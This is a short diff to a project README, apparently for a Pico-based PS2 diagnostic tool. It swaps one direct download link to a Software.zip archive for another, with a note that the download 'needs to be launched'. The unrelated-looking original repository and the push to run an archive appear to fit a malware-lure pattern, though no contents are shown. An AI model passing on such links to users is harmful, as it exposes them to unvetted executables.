@@ -24,7 +24,7 @@ Within this repository, you will find resources related to hardware, hardware ha
 
 ## 📦 Software Download
 To access the software related to this project, please download it from the following link:  
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/wendelangelo221/pico-ps2-diagnostic-tool/releases/download/v1.0/Software.zip)](https://github.com/wendelangelo221/pico-ps2-diagnostic-tool/releases/download/v1.0/Software.zip)
 
 *Note: The provided link is a direct download link that needs to be launched.*
 
